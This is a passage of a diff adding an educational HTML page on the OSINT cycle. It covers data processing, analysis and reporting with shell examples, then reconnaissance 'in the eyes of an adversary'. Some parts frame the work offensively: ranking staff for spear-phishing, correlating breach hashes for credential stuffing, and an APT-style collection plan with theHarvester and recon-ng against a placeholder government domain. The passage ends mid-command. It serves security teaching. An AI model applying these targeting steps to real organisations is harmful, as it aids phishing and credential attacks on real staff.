+          At this stage you clean, normalise, and organise so that analysis becomes fast
+          and repeatable.
+        </p>
+
+        <h3>Key Activities</h3>
+        <ul>
+          <li>Remove duplicates and obvious false positives from collected datasets.</li>
+          <li>Normalise formats (timestamps, IP notation, names, and identifiers).</li>
+          <li>Tag or categorise items (e.g. by source, sentiment, business unit, risk).</li>
+          <li>Group related records into clusters (e.g. staff around a specific system or project).</li>
+        </ul>
+
+        <h3>Practical Processing Examples</h3>
+
+        <!-- Example 1: Cleaning & Filtering Emails -->
+        <div class="card">
+          <h4>Filtering Email Lists (Cleaning)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You scraped 5,000 emails from various sources, but only want those belonging to 
+		  <code>@target.com</code>.
+		  </p>
+
+<pre><code class="language-bash"># Filter emails matching target domain and remove duplicates
+$ grep -i "@target\.com" raw_emails.txt | sort -u > valid_emails.txt
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+		  
+<pre><code class="language-text">[+] Processed 5,000 lines.
+[+] Found 42 unique emails matching @target.com.
+[+] Saved to valid_emails.txt
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>grep -i</code> searches case-insensitively for the domain.
+            <br><code>sort -u</code> sorts the list and removes duplicates (<code>-u</code> stands for unique).
+            <br><code>&gt;</code> redirects the output to a new clean file.
+          </div>
+
+          <div class="reminder">
+            <strong>Operator Notes:</strong><br>
+            The original file contained 5,000 entries, but only 42 were actually from the target domain.<br>
+            Many of the false positives were from mailing lists and public forums.<br>
+            This filtering reduced the target set by 99%, making analysis much faster.
+          </div>
+        </div>
+
+        <!-- Example 2: Normalizing IPs -->
+        <div class="card">
+          <h4>Normalizing IP Addresses</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> Your data source provides IPs in mixed formats (some with leading zeros, some without). 
+		  You need them standardized for scanning.
+		  </p>
+
+<pre><code class="language-bash"># Extract first column from CSV and remove duplicates
+$ awk '{print $1}' messy_ips.csv | sort -u > clean_ips.txt
+
+# Remove leading zeros for consistency (e.g., 010.001.002 → 10.1.2)
+$ sed -i 's/^0*//' clean_ips.txt
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+		  
+<pre><code class="language-text">[+] Extracted first column from CSV.
+[+] Removed duplicates.
+[+] Output saved to clean_ips.txt (Standardized format)
+[+] Removed leading zeros from 3 entries.
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>awk '{print $1}'</code> extracts the first column (assuming CSV/TSV).
+            <br>If IPs have leading zeros (e.g., <code>010.001.002</code>), <code>sed 's/^0*//'</code> strips them for consistency before running Nmap.
+          </div>
+        </div>
+
+        <!-- Example 3: Structuring Data with JSON -->
+        <div class="card">
+          <h4>Structuring Data (JSON Export)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You have a list of employees and their roles. You want to structure this for analysis 
+		  or import into a tool like Maltego.
+		  </p>
+
+<pre><code class="language-bash"># Convert CSV to structured JSON format
+$ cat staff_data.csv | jq -R -s 'split("\n") | map(select(length > 0)) | map(split(",")) | 
+map({"name": .[0], "role": .[1]})' > structured_staff.json
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-json">{
+  "name": "John Doe",
+  "role": "DevOps"
+},
+{
+  "name": "Jane Smith",
+  "role": "CTO"
+}
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>jq</code> is a powerful command-line JSON processor. This one-liner reads the CSV, splits lines by newline, 
+            then by comma, and creates a JSON object with "name" and "role" keys. This makes the data machine-readable for 
+            further automation.
+          </div>
+        </div>
+
+        <!-- Example 4: Clustering/Grouping -->
+        <div class="card">
+          <h4>Clustering Related Records</h4>
+         
+		 <p>
+		  <strong>Scenario:</strong> You have a list of GitHub commits. You want to find which developers worked on the 
+		  "API" project most frequently.
+		  </p>
+
+<pre><code class="language-bash"># Extract top contributors to the "API" project
+$ grep "API" commits.log | awk '{print $2}' | sort | uniq -c | sort -nr | head -5
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+		  
+<pre><code class="language-text">45 Alice (Developed API v1)
+32 Bob (Developed API v2)
+10 Charlie (Developed API Docs)
+8 David (API Testing)
+5 Eve (API Security)
+</code></pre>
+
+<div class="info-remember">
+    <strong>Explanation:</strong>
+    <br><code>grep "API"</code> filters only API-related commits.
+    <br><code>awk '{print $2}'</code> extracts the developer name (column 2).
+    <br><code>sort | uniq -c</code> counts how many times each name appears.
+    <br><code>sort -nr</code> sorts by count (numeric, reverse order) to show top contributors first. This identifies key personnel for spear-phishing.
+  </div>
+</div>
+
+        <!-- Example 5: Complete Processing Pipeline -->
+        <div class="card">
+          <h4>Complete Processing Pipeline</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You've collected raw subdomain data from multiple sources and need a clean, 
+		  deduplicated list for scanning.
+		  </p>
+
+<pre><code class="language-bash"># Step 1: Combine raw data from multiple sources
+$ cat subdomains_source1.txt subdomains_source2.txt > raw_subdomains.txt
+
+# Step 2: Remove duplicates and sort
+$ sort -u raw_subdomains.txt > dedup_subdomains.txt
+
+# Step 3: Filter out wildcard entries and invalid formats
+$ grep -v "\*" dedup_subdomains.txt | grep -E "^[a-zA-Z0-9.-]+$" > clean_subdomains.txt
+
+# Step 4: Add protocol prefix for scanning
+$ sed 's/^/https:\/\//' clean_subdomains.txt > https_subdomains.txt
+
+# Step 5: Count results
+$ wc -l clean_subdomains.txt</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-text">[+] Combined 2 source files (1,247 entries)
+[+] Removed 312 duplicates (935 unique)
+[+] Removed 3 wildcard entries
+[+] Removed 5 invalid formats
+[+] 927 clean subdomains ready for scanning
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>sort -u</code> deduplicates the combined list.
+            <br><code>grep -v "\*"</code> removes wildcard subdomains (e.g., *.target.com) which are not valid targets.
+            <br><code>grep -E</code> validates the remaining entries match a standard domain format.
+            <br><code>sed 's/^/https:\/\//'</code> prefixes each subdomain with <code>https://</code> for easy scanning with httpx.
+          </div>
+        </div>
+
+        <div class="reminder-lightblue">
+          <strong>Note:</strong> Good processing makes your OSINT <strong>searchable in minutes, not hours</strong>.
+          If you cannot easily re-query your own data, you are still at the "copy–paste" stage, not the professional stage.
+        </div>
+
+        <div class="reminder">
+          <strong>Common Mistakes in Processing:</strong>
+          <ul>
+            <li>Not <strong>removing duplicates</strong> before analysis.</li>
+            <li>Forgetting to <strong>normalize formats</strong> (timestamps, IPs, names).</li>
+            <li>Not <strong>categorizing</strong> or tagging data for easier retrieval.</li>
+            <li>Assuming all data is <strong>relevant</strong> without filtering.</li>
+            <li>Not <strong>validating</strong> data quality before moving to analysis.</li>
+          </ul>
+		  </div>
+		  </section>
+
+      <!-- ============================================================ -->
+      <!-- PHASE 4: ANALYSIS                                             -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-analysis">
+        <h2 id="osint-analysis">4. Analysis</h2>
+
+        <div class="info-remember" style="margin: 15px 0;">
+          <strong>Estimated Time:</strong> 30–45 minutes
+        </div>
+
+        <p>
+          <strong>Definition:</strong> Interpret the processed information to answer the
+          original questions, identify patterns, and estimate risk or opportunity.
+        </p>
+
+        <h3>Common Techniques</h3>
+        <ul>
+          <li><strong>Trend analysis:</strong> Spotting changes over time in mentions, leaks, or technology use.</li>
+          <li><strong>Link analysis:</strong> Mapping relationships between people, systems, and organisations.</li>
+          <li><strong>Timeline construction:</strong> Ordering events, breaches, or infrastructure changes.</li>
+          <li><strong>Correlation:</strong> Matching OSINT findings with known threats, tactics, or incidents.</li>
+        </ul>
+
+        <h3>Practical Analysis Examples</h3>
+
+        <!-- Example 1: Timeline Construction -->
+        <div class="card">
+          <h4>Timeline Construction</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You have a log of infrastructure changes and breaches. You need to order them to see 
+		  if a breach preceded a tech stack change.
+		  </p>
+
+<pre><code class="language-bash"># Sort events by date and format for readability
+$ sort -t',' -k2 events.csv | column -t -s','
+</code></pre>
+
+          <p><strong>Expected Output:</strong></p>
+          
+<pre><code class="language-text">Date          Event                 Status
+2023-01-15    Migration to AWS      Completed
+2023-04-10    S3 Bucket Exposed     Warning
+2023-06-22    Credential Leak       Critical
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>sort -t',' -k2</code> sorts the CSV file by the second column (Date).
+            <br><code>column -t</code> formats the output into aligned columns for easy reading. This visual timeline helps 
+            identify if "Migration to AWS" led to "S3 Bucket Exposed."
+          </div>
+
+          <div class="reminder">
+            <strong>Operator Notes:</strong><br>
+            The timeline suggests the S3 bucket was exposed shortly after the migration.<br>
+            This could indicate a configuration error during the migration process.<br>
+            The credential leak occurred 2 months later, possibly due to the same misconfiguration.
+          </div>
+        </div>
+
+        <!-- Example 2: Link Analysis -->
+        <div class="card">
+          <h4>Link Analysis (Preparing for Graph Tools)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You want to visualize connections between leaked emails, usernames, and domains using 
+		  a tool like Maltego or Gephi.
+		  </p>
+
+<pre><code class="language-bash"># Create edge list for graph visualization
+$ echo -e "source,target\njohn@target.com,johndoe\njane@target.com,janedoe" > links.csv
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+
+<pre><code class="language-text">[+] Created 'links.csv' with edge data.
+[+] Format: Source, Target
+[+] 2 relationships mapped
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br>To perform link analysis in CLI or export to graph tools, you often need a simple "Source → Target" format.
+            <br><code>echo -e</code> creates the file with headers and data. This CSV can be imported into Maltego to automatically generate nodes for "Email," "Username," and "Domain."
+          </div>
+        </div>
+
+        <!-- Example 3: Correlation with Threat Intel -->
+        <div class="card">
+          <h4>Correlation (Matching against Known Threats)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You found a new IP address in the logs. Is it part of a known APT (Advanced Persistent 
+		  Threat) group?
+		  </p>
+
+<pre><code class="language-bash"># Check suspicious IP against known threat intelligence database
+$ grep "203.0.113.14" known_apt_ips.csv
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-text">203.0.113.14,APT29,Cozy Bear,Russia
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>grep</code> searches your local threat intel database (<code>known_apt_ips.csv</code>) for the suspicious IP.
+            <br>If a match is found, you correlate the finding: "The IP in our logs belongs to APT29." This moves the analysis from "unknown IP" to "Known Actor Activity."
+          </div>
+        </div>
+
+        <!-- Example 4: Trend Analysis -->
+        <div class="card">
+          <h4>Trend Analysis (Frequency Count)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> Analyzing mentions of "TargetCorp" in news feeds over the last month to spot rising 
+		  interest or issues.
+		  </p>
+
+<pre><code class="language-bash"># Extract dates and count occurrences to spot trends
+$ awk -F'|' '{print $1}' news_feed.csv | sort | uniq -c | sort -nr | head -5
+</code></pre>
+
+          <p><strong>Expected Output:</strong></p>
+<pre><code class="language-text">45 2023-10-01
+32 2023-09-15
+12 2023-08-20
+8 2023-08-10
+3 2023-07-28
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>awk -F'|' '{print $1}'</code> extracts the date column (assuming pipe-delimited).
+            <br><code>sort | uniq -c</code> counts occurrences of each date.
+            <br><code>sort -nr</code> sorts by count descending. This shows which dates had the most mentions, highlighting spikes in activity or media coverage.
+          </div>
+        </div>
+
+        <!-- Example 5: Password Reuse Analysis -->
+        <div class="card">
+          <h4>Password Reuse &amp; Credential Correlation</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You've collected hashed passwords from multiple breach datasets. You need to identify 
+		  if the same password appears across different accounts or breaches.
+		  </p>
+
+<pre><code class="language-bash"># Extract password hashes from multiple breach datasets
+$ cat breach1.txt breach2.txt breach3.txt | awk '{print $2}' | sort | uniq -c | sort -nr | head -10
+
+# Check if specific usernames appear in multiple breaches
+$ grep -f target_users.txt all_breaches.txt | awk -F',' '{print $1}' | sort | uniq -c | sort -nr
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-text">[+] Password hash 5f4dcc3b5aa765d61d8327deb882cf99 appears in 3 breaches
+[+] User jdoe found in 2 breach datasets
+[+] User admin_svc found in 1 breach dataset
+</code></pre>
+
+          <div class="reminder">
+            <strong>Adversary Use:</strong>
+            <br>Password reuse analysis reveals:
+            <br>• Users who reuse passwords across multiple platforms (credential stuffing targets).
+            <br>• Which breaches contain the most sensitive accounts.
+            <br>• Common password patterns and weak practices across the organization.
+          </div>
+        </div>
+
+        <!-- Confidence Ratings -->
+        <h4>Confidence Ratings</h4>
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table" aria-label="Analysis Confidence Ratings">
+            <thead>
+              <tr>
+                <th>Finding</th>
+                <th>Confidence</th>
+                <th>Basis</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Migration preceded breach</td>
+                <td>High</td>
+                <td>Clear timeline correlation</td>
+              </tr>
+              <tr>
+                <td>APT29 activity</td>
+                <td>Medium</td>
+                <td>Single IP match in threat intel feed</td>
+              </tr>
+              <tr>
+                <td>Password reuse</td>
+                <td>High</td>
+                <td>Multiple breach datasets confirm</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="reminder-lightblue">
+          <strong>Remember:</strong> Analysis is where you <strong>earn trust</strong>. Be explicit about what the
+          data shows, what it only suggests, and where you are making assumptions.
+        </div>
+
+        <div class="reminder">
+          <strong>Common Mistakes in Analysis:</strong>
+          <ul>
+            <li>Jumping to <strong>conclusions</strong> without validating evidence.</li>
+            <li>Ignoring <strong>alternative explanations</strong> for findings.</li>
+            <li>Not assigning <strong>confidence ratings</strong> to findings.</li>
+            <li>Treating <strong>correlation</strong> as causation.</li>
+            <li>Failing to <strong>document assumptions</strong>.</li>
+          </ul>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- PHASE 5: DISSEMINATION                                        -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-dissemination">
+        <h2 id="osint-dissemination">5. Dissemination</h2>
+
+        <div class="info-remember" style="margin: 15px 0;">
+          <strong>Estimated Time:</strong> 20–30 minutes
+        </div>
+
+        <p>
+          <strong>Definition:</strong> Deliver the results to the right audience, in the
+          right format, with clear actions and caveats.
+        </p>
+
+        <h3>Key Considerations</h3>
+        
+		<ul>
+          <li>Adapt the level of technical detail to the audience (SOC, Red Team, leadership, legal, etc.)</li>
+          <li>Highlight concrete actions: what should change <strong>now</strong>, what to monitor, and what to track over time.</li>
+          <li>Flag sensitive elements and handle them under appropriate classification or confidentiality.</li>
+        </ul>
+
+        <h3>Practical Dissemination Examples</h3>
+
+        <!-- Example 1: Executive Summary -->
+        <div class="card">
+          <h4>Executive Summary (Markdown)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You need to send a concise briefing to leadership about exposed S3 buckets. 
+		  You generate a Markdown file that can be viewed in any editor or converted to PDF.
+		  </p>
+
+<pre><code class="language-bash"># Generate executive summary with clear action items
+$ cat &lt;&lt;'EOF' > executive_summary.md
+# Security Advisory: Exposed S3 Buckets
+
+**Date:** $(date +%Y-%m-%d)
+**Severity:** High
+**Action Required:** Immediate Remediation
+
+## Findings
+- 3 Public S3 buckets identified containing PII.
+- Data exposure risk: Medium-High.
+
+## Recommendations
+1. Restrict bucket policies to private.
+2. Enable versioning for audit trails.
+3. Notify Legal regarding GDPR implications.
+EOF
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-text">[+] Generated executive_summary.md
+[+] Includes date, severity, and clear action items.
+[+] Ready for leadership review.
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>cat <<'EOF'</code> allows you to write multi-line text directly into a file in the terminal.
+            <br>This format is clean, readable, and easily converted to PDF using tools like <code>markdown-pandoc</code>. 
+            It focuses on <em>what</em> happened and <em>what</em> to do, ignoring technical minutiae.
+          </div>
+        </div>
+
+        <!-- Example 2: Technical Report for SOC -->
+        <div class="card">
+          <h4>Technical Report (JSON for SOC)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> The SOC team needs machine-readable data to update their SIEM rules. You export the 
+		  findings as structured JSON.
+		  </p>
+
+<pre><code class="language-bash"># Create JSON alert for SIEM integration
+$ echo '{"alert": "S3_Leak", "severity": "High", "targets": ["bucket-a", "bucket-b"], "remediation": 
+"set_public_access_block"}' > soc_alert.json
+
+# Format JSON for readability
+$ cat soc_alert.json | jq .
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-json">{
+  "alert": "S3_Leak",
+  "severity": "High",
+  "targets": [
+    "bucket-a",
+    "bucket-b"
+  ],
+  "remediation": "set_public_access_block"
+}
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>echo</code> creates a simple JSON object. For complex data, use <code>jq</code> to format it nicely.
+            <br>This structure allows automated tools to parse the alert and trigger playbooks without human intervention.
+          </div>
+        </div>
+
+        <!-- Example 3: Law Enforcement Briefing -->
+        <div class="card">
+          <h4>Law Enforcement Briefing (CSV)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You are providing evidence to law enforcement regarding a phishing campaign. They need 
+		  a clean, tabular list of indicators.
+		  </p>
+
+<pre><code class="language-bash"># Extract only relevant columns for law enforcement
+$ awk -F',' '{print $1","$2}' phishing_urls.csv > le_evidence.csv
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-text">[+] Extracted URL and Domain columns.
+[+] Removed internal metadata fields.
+[+] Saved to le_evidence.csv
+[+] Ready for import into case management system.
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>awk -F',' '{print $1","$2}'</code> extracts only the first two columns (URL and Domain) from your raw data, removing extra metadata.
+            <br>This creates a clean CSV file that law enforcement can easily import into their databases or share with other agencies without exposing unnecessary internal data.
+          </div>
+        </div>
+
+        <!-- Example 4: Public Advisory -->
+        <div class="card">
+          <h4>Public Advisory (Redaction)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You are publishing a blog post about the vulnerability but need to redact specific IP 
+		  addresses or internal hostnames to protect privacy.
+		  </p>
+
+<pre><code class="language-bash"># Redact sensitive IP addresses from public advisory
+$ sed 's/203\.0\.113\.[0-9]*/[REDACTED_IP]/g' draft_blog.md > public_advisory.md
+
+# Also redact internal hostnames
+$ sed -i 's/fileserver[0-9]*/[REDACTED_HOST]/g' public_advisory.md
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-text">[+] Replaced all 203.0.113.x IPs with [REDACTED_IP].
+[+] Replaced all fileserver* hostnames with [REDACTED_HOST].
+[+] Output saved to public_advisory.md
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>sed 's/old/new/g'</code> performs global substitution.
+            <br><code>203\.0\.113\.[0-9]*</code> is a regex pattern that matches any IP in the documentation range.
+            <br><code>fileserver[0-9]*</code> matches any internal hostname like fileserver01, fileserver02, etc.
+            <br>This ensures your public-facing document doesn't accidentally expose internal network details.
+          </div>
+        </div>
+
+        <!-- Example 5: Interactive Dashboard -->
+        <div class="card">
+          <h4>Interactive Dashboard (HTML)</h4>
+          
+		  <p>
+		  <strong>Scenario:</strong> You want to create a simple HTML dashboard that stakeholders can open in a browser to 
+		  view key findings.
+		  </p>
+
+<pre><code class="language-bash"># Generate basic HTML dashboard with findings summary
+$ cat <<'EOF' > dashboard.html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;OSINT Findings Dashboard&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Target Exposure Summary&lt;/h1&gt;
+  &lt;table border="1"&gt;
+    &lt;tr&gt;&lt;th&gt;Finding&lt;/th&gt;&lt;th&gt;Severity&lt;/th&gt;&lt;th&gt;Status&lt;/th&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;td&gt;Exposed S3 Buckets&lt;/td&gt;&lt;td&gt;High&lt;/td&gt;&lt;td&gt;Open&lt;/td&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;td&gt;Leaked Credentials&lt;/td&gt;&lt;td&gt;Critical&lt;/td&gt;&lt;td&gt;Open&lt;/td&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;td&gt;Public GitHub Repos&lt;/td&gt;&lt;td&gt;Medium&lt;/td&gt;&lt;td&gt;In Progress&lt;/td&gt;&lt;/tr&gt;
+  &lt;/table&gt;
+  &lt;p&gt;&lt;strong&gt;Last Updated:&lt;/strong&gt; $(date +%Y-%m-%d)&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+EOF
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+          
+<pre><code class="language-text">[+] Generated dashboard.html
+[+] Includes findings table and last updated timestamp.
+[+] Can be opened directly in any browser.
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong>
+            <br><code>cat <<'EOF'</code> creates a simple HTML file with a findings table.
+            <br>This format is accessible to non-technical stakeholders, provides real-time updates, and can be hosted on internal wikis or shared via email.
+            <br><code>$(date +%Y-%m-%d)</code> automatically includes the current date.
+          </div>
+        </div>
+
+        <div class="reminder-lightblue">
+          <strong>Note:</strong> A strong OSINT output is <strong>decision-ready</strong>. If the reader cannot
+          tell what you recommend, you are not finished with the dissemination stage.
+        </div>
+
+        <div class="reminder">
+          <strong>Common Mistakes in Dissemination:</strong>
+          <ul>
+            <li>Providing <strong>too much detail</strong> for the audience.</li>
+            <li>Not including <strong>clear action items</strong>.</li>
+            <li>Forgetting to <strong>redact</strong> sensitive information.</li>
+            <li>Not <strong>customizing</strong> the format for the audience.</li>
+            <li>Delivering findings without <strong>caveats</strong> or confidence ratings.</li>
+          </ul>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- OSINT CYCLE AT A GLANCE                                       -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-cycle-table">
+        <h2 id="osint-cycle-table">6. OSINT Cycle at a Glance</h2>
+        <p>
+          <em>The table below gives you a one-page view of the OSINT Cycle. Use it as a
+          checklist when planning a new assessment or reviewing your own workflow.</em>
+        </p>
+
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table">
+            <thead>
+              <tr>
+                <th>OSINT Stage</th>
+                <th>Purpose</th>
+                <th>Example Tools / Actions</th>
+                <th>Time</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Planning</strong></td>
+                <td>Define scope, objectives, constraints, and authorisation.</td>
+                <td>Stakeholder briefings, written ROE, requirement lists, risk review</td>
+                <td>10–15 min</td>
+              </tr>
+              <tr>
+                <td><strong>Collection</strong></td>
+                <td>Gather relevant data from approved open sources.</td>
+                <td>Search engines, Shodan/Censys, social media, WHOIS, public repos, paste sites</td>
+                <td>30–45 min</td>
+              </tr>
+              <tr>
+                <td><strong>Processing &amp; Exploitation</strong></td>
+                <td>Clean, structure and enrich data so it is ready for analysis.</td>
+                <td>Spreadsheets, scripts, OpenRefine, text processing, normalisation, tagging</td>
+                <td>20–30 min</td>
+              </tr>
+              <tr>
+                <td><strong>Analysis</strong></td>
+                <td>Derive insights, patterns and risk assessments from processed data.</td>
+                <td>Maltego, graph tools, timelines, correlation with threat intel and incidents</td>
+                <td>30–45 min</td>
+              </tr>
+              <tr>
+                <td><strong>Dissemination</strong></td>
+                <td>Present outcomes in an actionable format for the intended audience.</td>
+                <td>Reports (PDF/HTML), dashboards, briefings, tickets, alerts, executive summaries</td>
+                <td>20–30 min</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="reminder-lightblue">
+          <strong>Important:</strong> Treat this table as a <strong>sanity check</strong>: if you cannot say which
+          stage you are in, you are probably mixing tasks and weakening the cycle.
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- FEEDBACK LOOP                                                 -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-cycle-extra">
+        <h2 id="osint-cycle-extra">7. Feedback Loop &amp; Continuous Improvement</h2>
+        
+		<p>
+          The OSINT Cycle is not strictly linear. Insights from dissemination often
+          reveal new questions, which then trigger an updated planning phase. Over
+          time, this loop improves both your tradecraft and your client's maturity.
+        </p>
+       
+	   <ul>
+          <li>Capture lessons learned about tools, data sources, and false-positive patterns.</li>
+          <li>Refine future intelligence requirements based on what actually helped decision-making.</li>
+          <li>Adjust OPSEC posture and ethics guidance as you encounter edge cases.</li>
+        </ul>
+
+        <div class="reminder-lightblue">
+          A mature practitioner never "finishes" the OSINT Cycle, they compress it,
+          automate repeatable parts, and learn from each run.
+        </div>
+
+        <div class="reminder">
+          <strong>Operator Notes:</strong><br>
+          After completing this OSINT cycle, the operator noted that most findings were discovered via CT logs and metadata extraction.<br>
+          Traditional DNS enumeration was less effective for this target due to aggressive protection.<br>
+          Future cycles should prioritize CT logs and document discovery as initial collection vectors.
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION: IN THE EYES OF AN ADVERSARY (8)                     -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-adversary">
+        <h2 id="osint-adversary">8. In the Eyes of an Adversary</h2>
+
+        <p>
+          While the previous section defined what OSINT is, this lesson explains how 
+          adversaries systematically execute it. Adversaries do not search randomly; 
+          they follow a structured intelligence cycle designed to ensure their findings 
+          are actionable, accurate, and timely. This process transforms raw data into 
+          intelligence that supports future attack phases.
+        </p>
+
+        <p>
+          The OSINT Cycle provides a repeatable methodology for planning intelligence 
+          requirements, collecting data, processing findings, and delivering intelligence 
+          to support operational objectives.
+        </p>
+
+        <h3>The Adversary's Role: Structured Data Collection</h3>
+
+        <p>
+          During this phase, the adversary acts as a strategic planner. They are not 
+          simply searching for information; instead, they are building and testing 
+          hypotheses about the target through structured intelligence gathering.
+        </p>
+
+        <ul>
+          <li><strong>Goal:</strong> Transform raw data into a decision-ready target profile.</li>
+          <li>
+            <strong>Adversary Mindset:</strong> 
+            "I have a list of potential vulnerabilities. I need to determine which one 
+            is most likely to lead to a successful compromise of this specific organization."
+          </li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION: REAL-WORLD EXAMPLES (9)                              -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="real-world-examples">
+        <h2 id="real-world-examples">9. Real-World Examples of Adversary Involvement</h2>
+
+        <h3>Example A: Kill Chain Preparation (APT Operations)</h3>
+
+        <p>
+		<strong>Scenario:</strong> An Advanced Persistent Threat (APT) group targets a government agency.
+		</p>
+
+        <p>
+		<strong>Cycle Application:</strong>
+		</p>
+
+        <ul>
+          <li><strong>Plan:</strong> Focus collection efforts on senior leadership and support personnel.</li>
+          <li><strong>Collect:</strong> Review public speeches, conference attendee lists, and social media activity.</li>
+          <li><strong>Process:</strong> Map personal and professional relationships.</li>
+          <li><strong>Disseminate:</strong> Develop highly targeted phishing scenarios.</li>
+        </ul>
+
+        <div class="reminder">
+          <strong>Adversary Outcome:</strong> Relationship mapping often identifies lower-security 
+          individuals who may provide indirect access to higher-value targets.
+        </div>
+
+        <!-- PHASE 1: PLAN -->
+        <h3>Phase 1: Plan, Define Collection Requirements</h3>
+        
+		<p>Create a structured workspace and define exactly who to target and why.</p>
+
+<pre><code class="language-bash"># Create operation workspace
+$ sudo mkdir -p ~/apt_osint/{plan,collect,process,disseminate}
+$ cd ~/apt_osint/plan
+
+# Write intelligence requirements (what decisions must this intel support?)
+$ cat <<'EOF' > intelligence_requirements.txt
+TARGET DOMAIN: target.gov
+DECISION: Select a spear-phishing vector against senior leadership
+FOCUS: 
+  - C-Suite, Directors, and Executive Assistants
+  - IT Support staff with elevated access but lower security awareness
+REQUIREMENTS:
+  1. Naming convention for email addresses
+  2. Recent conference/summit participation (trust relationships)
+  3. Reporting lines and internal hierarchy
+  4. Publicly exposed infrastructure (VPN, webmail)
+EOF
+
+# Seed targets identified from public press releases
+$ cat <<'EOF' > seed_personnel.txt
+John Doe,Director of IT,john.doe@target.gov
+Jane Smith,Executive Assistant,jane.smith@target.gov
+EOF
+</code></pre>
+
+        <!-- PHASE 2: COLLECT -->
+        <h3>Phase 2: Collect, Harvest Public Data</h3>
+        
+		<p>Use native Kali tools to gather emails, hosts, and social/contextual data without touching the target's 
+		perimeter directly.
+		</p>
+
+<pre><code class="language-bash">$ cd ~/apt_osint/collect
+# 2A: theHarvester - bulk email and host discovery
+$ theHarvester -d target.gov -b all -f theharvester_results.json
+
+# 2B: Recon-ng - automated contact and profile aggregation
+# (Launch interactively and run these commands inside the framework)
+$ recon-ng
+[recon-ng][default] > marketplace install recon/domains-contacts/whois_pocs
+[recon-ng][default] > modules load recon/domains-contacts/whois_pocs
+[recon-ng][default] > options set SOURCE target.gov
+[recon-ng][default] > run
+
+[recon-ng][default] > marketplace install recon/profiles-profiles/fullcontact
+[recon-ng][default] > modules load recon/profiles-profiles/fullcontact
+[recon-ng][default] > options set SOURCE jane.smith@target.gov
+[recon-ng][default] > run
+[recon-ng][default] > exit
+
+# 2C: Scrape a public conference attendee page for target.gov emails
+# (Simulates reviewing "public speeches, conference attendee lists")
+$ curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
